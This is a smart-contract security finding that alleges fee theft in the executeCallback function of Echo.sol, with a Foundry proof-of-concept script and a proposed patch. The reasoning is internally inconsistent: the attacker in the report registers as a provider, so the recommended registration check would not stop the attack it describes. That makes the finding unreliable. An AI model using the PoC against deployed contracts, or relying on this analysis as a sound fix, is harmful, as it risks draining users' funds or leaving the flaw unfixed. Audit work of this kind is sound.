### Title
Missing `isRegistered` Check in `executeCallback` Allows Fee Theft After Exclusivity Period - (File: `target_chains/ethereum/contracts/contracts/echo/Echo.sol`)

---

### Summary

`requestPriceUpdatesWithCallback` enforces that the provider is registered before accepting a request, but `executeCallback` performs no equivalent check on `providerToCredit`. After the exclusivity period expires, any caller can pass an arbitrary registered address as `providerToCredit` and redirect all accrued fees away from the legitimate provider.

---

### Finding Description

In `Echo.sol`, the two-step price-update flow is:

**Step 1 — Request (initiation):** `requestPriceUpdatesWithCallback` gates on `isRegistered`:

```solidity
// Echo.sol L58-61
require(
    _state.providers[provider].isRegistered,
    "Provider not registered"
);
```

The request is stored with `req.provider = provider` (L83).

**Step 2 — Fulfillment (completion):** `executeCallback` accepts a caller-supplied `providerToCredit` and unconditionally credits fees to it:

```solidity
// Echo.sol L161-162
_state.providers[providerToCredit].accruedFeesInWei += SafeCast
    .toUint128((req.fee + msg.value) - pythFee);
```

The only guard on `providerToCredit` is the exclusivity-period check:

```solidity
// Echo.sol L114-121
if (block.timestamp < req.publishTime + _state.exclusivityPeriodSeconds) {
    require(
        providerToCredit == req.provider,
        "Only assigned provider during exclusivity period"
    );
}
```

Once `block.timestamp >= req.publishTime + exclusivityPeriodSeconds` (default: 15 seconds), the exclusivity guard is skipped entirely and **no check on `providerToCredit` remains**. There is no `require(_state.providers[providerToCredit].isRegistered, ...)` in `executeCallback`.

This is the direct analog of the reported pattern: the state-validity check (`isRegistered` / `sellable`) exists at initiation but is absent at completion.

---

### Impact Explanation

A registered provider (attacker) can steal fees from any in-flight request whose exclusivity period has elapsed:

1. Attacker calls `registerProvider(...)` — sets `isRegistered = true`.
2. Attacker calls `setFeeManager(attacker)` — makes themselves their own fee manager (this call itself requires `isRegistered`, which the attacker satisfies).
3. A victim user calls `requestPriceUpdatesWithCallback` targeting `legitimateProvider`. Fees (`req.fee`) are locked in the contract.
4. After 15 seconds (default exclusivity period), attacker calls `executeCallback(attacker, sequenceNumber, updateData, priceIds)`.
5. `_state.providers[attacker].accruedFeesInWei` is incremented by the full fee amount.
6. Attacker calls `withdrawAsFeeManager(attacker, amount)` and withdraws the stolen fees.

The legitimate provider receives nothing. The user's callback is still executed (no DoS), but the economic incentive for the legitimate provider is fully stolen.

---

### Likelihood Explanation

- The default exclusivity period is 15 seconds, meaning the attack window opens almost immediately after any request.
- Any address that calls `registerProvider` (permissionless) becomes eligible to execute this attack.
- No privileged access, leaked key, or governance majority is required.
- The attacker only needs to monitor the mempool or chain for `PriceUpdateRequested` events and submit `executeCallback` after the exclusivity window.

---

### Recommendation

Add a `isRegistered` check for `providerToCredit` at the top of `executeCallback`, mirroring the check in `requestPriceUpdatesWithCallback`:

```solidity
function executeCallback(
    address providerToCredit,
    uint64 sequenceNumber,
    bytes[] calldata updateData,
    bytes32[] calldata priceIds
) external payable override {
+   require(
+       _state.providers[providerToCredit].isRegistered,
+       "Provider not registered"
+   );
    Request storage req = findActiveRequest(sequenceNumber);
    ...
}
```

---

### Proof of Concept

```solidity
// 1. Attacker registers and sets themselves as fee manager
vm.prank(attacker);
echo.registerProvider(0, 0, 0);
vm.prank(attacker);
echo.setFeeManager(attacker);

// 2. Victim makes a request to legitimateProvider
vm.deal(victim, totalFee);
vm.prank(victim);
uint64 seq = echo.requestPriceUpdatesWithCallback{value: totalFee}(
    legitimateProvider, block.timestamp, priceIds, gasLimit
);

// 3. Wait for exclusivity period (15 seconds default)
vm.warp(block.timestamp + 16);

// 4. Attacker calls executeCallback crediting themselves
echo.executeCallback(attacker, seq, updateData, priceIds);

// 5. Attacker withdraws stolen fees
uint128 stolen = echo.getProviderInfo(attacker).accruedFeesInWei;
vm.prank(attacker);
echo.withdrawAsFeeManager(attacker, stolen);
// legitimateProvider.accruedFeesInWei == 0
```

**Root cause:** [1](#0-0)  — `isRegistered` check exists at request time.

**Missing check at fulfillment:** [2](#0-1)  — no `isRegistered` check on `providerToCredit` in `executeCallback`.

**Unconditional fee credit:** [3](#0-2)  — fees credited to any address without validation.

### Citations

**File:** target_chains/ethereum/contracts/contracts/echo/Echo.sol (L58-61)
```text
        require(
            _state.providers[provider].isRegistered,
            "Provider not registered"
        );
```

**File:** target_chains/ethereum/contracts/contracts/echo/Echo.sol (L105-121)
```text
    function executeCallback(
        address providerToCredit,
        uint64 sequenceNumber,
        bytes[] calldata updateData,
        bytes32[] calldata priceIds
    ) external payable override {
        Request storage req = findActiveRequest(sequenceNumber);

        // Check provider exclusivity using configurable period
        if (
            block.timestamp < req.publishTime + _state.exclusivityPeriodSeconds
        ) {
            require(
                providerToCredit == req.provider,
                "Only assigned provider during exclusivity period"
            );
        }
```

**File:** target_chains/ethereum/contracts/contracts/echo/Echo.sol (L161-162)
```text
        _state.providers[providerToCredit].accruedFeesInWei += SafeCast
            .toUint128((req.fee + msg.value) - pythFee);
```
